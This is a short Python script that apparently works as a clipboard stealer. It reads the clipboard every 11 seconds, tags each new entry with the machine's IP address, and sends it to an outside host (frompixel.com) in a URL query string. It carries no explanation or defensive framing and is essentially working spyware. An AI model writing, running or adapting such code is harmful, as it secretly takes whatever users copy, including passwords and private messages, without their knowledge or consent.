import urllib, os, sys, requests, pyperclip, time, socket
clist = ['None']
adresse = socket.gethostbyname(socket.gethostname());
while True:
    clip = pyperclip.paste()
    msg = clip.encode('utf-8')
    msg = adresse + " : " + msg
    if msg not in clist:
        clist.append(msg)
        urllib.urlopen("https://frompixel.com/recept/recept.php?a=" + msg + "&sujet=clipbord")
    time.sleep(11)
